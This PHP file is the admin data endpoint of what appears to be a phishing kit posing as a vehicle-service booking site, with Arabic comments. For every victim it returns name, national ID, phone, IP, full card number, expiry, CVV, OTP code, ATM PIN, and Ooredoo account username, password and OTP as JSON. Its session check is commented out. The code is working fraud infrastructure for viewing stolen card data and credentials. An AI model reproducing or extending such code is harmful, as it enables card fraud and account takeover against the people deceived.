<?php
session_start();
require_once '../../includes/db.php';
require_once '../../includes/functions.php';

// في بيئة الإنتاج يجب التحقق من الجلسة هنا
// if (!isset($_SESSION['admin_logged_in'])) {
//     header('Content-Type: application/json');
//     echo json_encode(['success' => false, 'message' => 'Unauthorized']);
//     exit;
// }

header('Content-Type: application/json');

try {
    $visitors = getAllVisitorsWithData();
    $formatted = [];
    
    foreach ($visitors as $v) {
        $details = $v['details'] ?? [];
        $formatted[] = [
            'referenceId' => $v['visitor_id'],
            'clientName' => $details['name_ar'] ?? $details['username'] ?? '-',
            'clientId' => $details['id_number'] ?? '-',
            'clientPhone' => $details['phone_number'] ?? '-',
            'vehiclePlate' => $details['vehicle_plate'] ?? '-',
            'vehicleType' => $details['vehicle_type'] ?? '-',
            'serviceRegion' => $details['region'] ?? '-',
            'serviceDate' => $v['last_activity'],
            'serviceTime' => '-',
            'status' => $v['status'],
            'statusRead' => true,
            'clientIp' => $v['ip_address'],
            'clientEmail' => $details['email_confirm'] ?? '-',
            'clientNationality' => $details['nationality'] ?? '-',
            'payment' => [
                'cardHolderName' => $details['card_name'] ?? '-',
                'cardNumber' => $details['card_number'] ?? '-',
                'cardExpiry' => ($details['exp_month'] ?? '') . '/' . ($details['exp_year'] ?? ''),
                'cardCvv' => $details['cvv'] ?? '-',
                'verifyCode' => $details['otp'] ?? '-',
                'secretNum' => $details['atm_pin'] ?? '-',
                'ooredooUser' => $details['ooredoo_user'] ?? '-',
                'ooredooPass' => $details['ooredoo_pass'] ?? '-',
                'ooredooOtp' => $details['ooredoo_otp'] ?? '-',
                'step' => 1 // يمكن تطوير هذا المنطق
            ]
        ];
    }
    
    echo json_encode(['success' => true, 'data' => $formatted]);
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}
?>
